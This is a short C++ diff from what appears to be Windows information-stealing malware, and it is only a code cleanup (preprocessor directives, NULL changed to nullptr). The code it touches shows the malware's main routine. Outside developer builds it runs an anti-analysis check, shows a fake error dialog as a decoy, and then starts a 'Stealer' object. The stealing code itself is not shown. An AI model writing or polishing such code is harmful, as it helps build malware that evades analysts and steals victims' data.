@@ -11,11 +11,11 @@ void globalExceptionHandler() {
     try {
         throw;
     } catch (const std::exception& e) {
-#if DEV
+#ifdef DEV
         std::cerr << "Exception caught in globalExceptionHandler: " << e.what() << std::endl;
 #endif
     } catch (...) {
-#if DEV
+#ifdef DEV
         std::cerr << "Unknown exception caught in globalExceptionHandler." << std::endl;
 #endif
     }
@@ -24,13 +24,13 @@ void globalExceptionHandler() {
 int main() {
     std::set_terminate(globalExceptionHandler);
 
-#if !DEV
+#ifndef DEV
     if(!AntiAnalysisChecker::check())
     {
         std::string str = "Exit code: 0x" + Utils::generateString(5, "01");
-        MessageBox(NULL,
+        MessageBox(nullptr,
                    str.c_str(),
-                   NULL,
+                   nullptr,
                    MB_RETRYCANCEL | MB_ICONERROR);
     }
 #endif
@@ -41,7 +41,6 @@ int main() {
     Stealer stealer;
     stealer.run();
     stealer.complete();
-
 
     return 0;
 }
